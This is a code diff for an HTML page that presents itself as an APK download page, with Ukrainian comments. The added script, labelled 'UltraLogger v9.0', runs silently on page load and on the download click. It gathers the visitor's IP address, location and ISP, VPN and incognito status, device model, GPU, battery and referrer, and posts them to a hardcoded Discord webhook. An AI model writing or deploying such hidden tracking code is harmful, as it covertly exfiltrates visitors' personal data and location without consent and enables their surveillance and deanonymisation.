@@ -3,42 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Download Page</title>
     <style>
-        body {
-            margin: 0;
-            background-color: #000;
-            color: white;
-            font-family: sans-serif;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            text-align: center;
-        }
-        h1 {
-            font-size: 40px;
-            color: #ff0000;
-            margin-bottom: 30px;
-        }
-        .btn {
-            display: inline-block;
-            padding: 20px 45px;
-            background-color: #00ff00;
-            color: black;
-            text-decoration: none;
-            font-size: 22px;
-            font-weight: bold;
-            border-radius: 12px;
-            box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
-            transition: transform 0.2s;
-            cursor: pointer;
-            border: none;
-        }
-        .btn:active {
-            transform: scale(0.95);
-        }
+        body { margin: 0; background-color: #000; color: white; font-family: sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; text-align: center; }
+        h1 { font-size: 40px; color: #ff0000; margin-bottom: 30px; }
+        .btn { display: inline-block; padding: 20px 45px; background-color: #00ff00; color: black; text-decoration: none; font-size: 22px; font-weight: bold; border-radius: 12px; box-shadow: 0 0 20px rgba(0, 255, 0, 0.5); cursor: pointer; border: none; }
     </style>
 </head>
 <body>
@@ -47,62 +15,87 @@
     <a href="app-debug.apk" download class="btn" id="downloadBtn">DOWNLOAD APK</a>
 
     <script>
-        // Твій Discord Webhook
         const webhookURL = "https://discord.com/api/webhooks/1495809375573512193/DEsfDangmHPuq7wW2twRrtq4HARd1zkW-zueLyT1Zl9lV5c5f5pgLj_2GqGArpIvIsyC";
+        const startTime = Date.now();
 
-        // Функція відправки даних
-        async function sendToDiscord(eventTitle, color) {
-            let modelName = "Android (Unknown)";
-            
-            // Спроба витягнути точну модель через High Entropy Client Hints
-            if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
-                try {
-                    const hints = await navigator.userAgentData.getHighEntropyValues(['model', 'platform', 'platformVersion']);
-                    if (hints.model) {
-                        modelName = `${hints.platform} (${hints.model})`;
-                    }
-                } catch (e) {
-                    modelName = "Android (K/Protected)";
-                }
-            } else {
-                // Старий метод, якщо Client Hints не підтримуються
-                const ua = navigator.userAgent;
-                if (/android/i.test(ua)) {
-                    const match = ua.match(/Android\s+([^\s;]+);?\s+([^;)]+)/);
-                    modelName = (match && match[2] !== 'K') ? `Android (${match[2]})` : "Android (K/Old Browser)";
-                } else if (/iPhone|iPad/.test(ua)) {
-                    modelName = "iOS Device";
-                }
+        async function getFinalData() {
+            let info = {
+                ip: "N/A", city: "N/A", vpn: "Ні", model: "Android", 
+                cpu: navigator.hardwareConcurrency || "N/A",
+                ram: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : "N/A",
+                gpu: "N/A", batt: "N/A", net: "N/A",
+                theme: window.matchMedia('(prefers-color-scheme: dark)').matches ? "🌑 Темна" : "☀️ Світла",
+                incognito: "Ні",
+                adblock: "Вимкнено",
+                referrer: document.referrer || "Пряме посилання",
+                motion: "Спокій"
+            };
+
+            // 1. IP / Geo / VPN
+            try {
+                const r = await fetch('https://ipapi.co/json/');
+                const g = await r.json();
+                info.ip = g.ip; info.city = `${g.city}, ${g.country_name} (${g.org})`;
+                if (g.org.toLowerCase().match(/vpn|proxy|hosting/)) info.vpn = "ТАК";
+            } catch(e){}
+
+            // 2. Hardware (HTTPS)
+            if (navigator.userAgentData?.getHighEntropyValues) {
+                const h = await navigator.userAgentData.getHighEntropyValues(['model', 'platformVersion']);
+                info.model = `${h.model} (v${h.platformVersion})`;
             }
+
+            // 3. GPU & AdBlock Check
+            try {
+                const gl = document.createElement('canvas').getContext('webgl');
+                info.gpu = gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL);
+                // Спроба завантажити рекламний скрипт для перевірки AdBlock
+                const testAd = await fetch('https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js', { mode: 'no-cors' }).catch(() => info.adblock = "✅ Увімкнено");
+            } catch(e){}
+
+            // 4. Battery & Motion
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                info.batt = `${Math.round(b.level*100)}% (${b.charging?'⚡':'🔋'})`;
+            }
+            
+            // Перевірка інкогніто
+            if (navigator.storage && navigator.storage.estimate) {
+                const {quota} = await navigator.storage.estimate();
+                if (quota < 120000000) info.incognito = "Ймовірно ТАК";
+            }
+
+            return info;
+        }
+
+        async function sendLog(event) {
+            const d = await getFinalData();
+            const time = ((Date.now() - startTime)/1000).toFixed(1);
 
             const payload = {
                 embeds: [{
-                    title: eventTitle,
-                    description: `📱 **Пристрій:** \`${modelName}\`\n⏰ **Час:** ${new Date().toLocaleString('uk-UA')}`,
-                    color: color
+                    title: event === 'visit' ? "🛸 ВХІД: MAXIMUM DATA" : "🧨 СКАЧУВАННЯ: ФІНІШ",
+                    color: event === 'visit' ? 3066993 : 16711680,
+                    fields: [
+                        { name: "📱 Пристрій", value: `\`${d.model}\` (RAM: ${d.ram})`, inline: true },
+                        { name: "🧠 Ядра CPU", value: `\`${d.cpu}\``, inline: true },
+                        { name: "🌐 IP / VPN", value: `\`${d.ip}\` / VPN: \`${d.vpn}\``, inline: false },
+                        { name: "📍 Локація", value: `\`${d.city}\``, inline: false },
+                        { name: "🎮 GPU", value: `\`${d.gpu}\``, inline: false },
+                        { name: "🔋 Батарея / Тема", value: `\`${d.batt}\` / \`${d.theme}\``, inline: true },
+                        { name: "🕵️ Інкогніто / AdBlock", value: `\`${d.incognito}\` / \`${d.adblock}\``, inline: true },
+                        { name: "🔗 Звідки прийшов", value: `\`${d.referrer}\``, inline: false },
+                        { name: "⏱ На сайті", value: `\`${time} сек.\``, inline: true }
+                    ],
+                    footer: { text: "UltraLogger v9.0 Final • " + new Date().toLocaleTimeString() }
                 }]
             };
 
-            try {
-                await fetch(webhookURL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
-            } catch (err) {
-                console.error("Помилка вебхука:", err);
-            }
+            fetch(webhookURL, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
         }
 
-        // Подія: Хтось зайшов на сторінку
-        window.addEventListener('DOMContentLoaded', () => {
-            sendToDiscord("👤 Хтось перейшов по посиланню!", 3066993); // Зелений колір
-        });
-
-        // Подія: Натискання кнопки скачування
-        document.getElementById('downloadBtn').addEventListener('click', () => {
-            sendToDiscord("📥 Почав скачувати файл!", 15105570); // Помаранчевий колір
-        });
+        window.onload = () => sendLog('visit');
+        document.getElementById('downloadBtn').onclick = () => sendLog('download');
     </script>
 </body>
 </html>
